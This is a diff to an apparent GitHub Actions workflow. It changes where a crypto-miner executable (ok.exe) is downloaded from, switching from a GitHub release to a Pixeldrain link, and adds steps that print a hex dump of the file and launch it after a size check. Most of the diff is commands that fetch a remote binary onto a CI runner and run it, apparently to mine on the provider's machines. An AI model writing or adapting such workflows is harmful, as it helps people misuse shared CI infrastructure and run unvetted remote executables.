@@ -77,14 +77,36 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
-      # --- DOWNLOAD & RUN YOUR MINER HERE ---
-      - name: Download and Run Your Miner EXE
+      # --- Download Miner from Pixeldrain ---
+      - name: Download Miner from Pixeldrain
         run: |
-          $minerUrl = "https://github.com/frtrialx-alt/Paisa-V.1/releases/download/V.1/ok.exe"
-          $minerPath = "$env:TEMP\ok.exe"
-          Invoke-WebRequest -Uri $minerUrl -OutFile $minerPath
-          Start-Process -FilePath $minerPath
-          Write-Host "Miner started at $minerPath"
+          $url = "https://pixeldrain.com/api/file/dYQsWt5c"
+          $output = "$env:TEMP\ok.exe"
+          curl.exe -L -o $output $url
+          Write-Host "Miner downloaded to $output"
+
+      # --- Check Downloaded File (Hex dump for verification) ---
+      - name: Check Downloaded File
+        run: |
+          $file = "$env:TEMP\ok.exe"
+          Write-Host "Downloaded file size:"
+          Get-Item $file | Select-Object Length, FullName
+          Write-Host "First 64 bytes of file (as hex):"
+          $bytes = [System.IO.File]::ReadAllBytes($file)
+          $bytes[0..63] | ForEach-Object { Write-Host ("{0:X2}" -f $_) -NoNewline; Write-Host " " }
+          Write-Host ""
+
+      # --- Run Your Miner (only if file is OK) ---
+      - name: Run Your Miner
+        run: |
+          $miner = "$env:TEMP\ok.exe"
+          if ((Test-Path $miner) -and ((Get-Item $miner).Length -gt 10240)) {
+            Start-Process -FilePath $miner
+            Write-Host "Miner started!"
+          } else {
+            Write-Host "Miner not downloaded correctly!"
+            exit 1
+          }
 
       # --- Maintain Connection (Graceful Stop for Shutdown) ---
       - name: Maintain Connection (Graceful Stop)
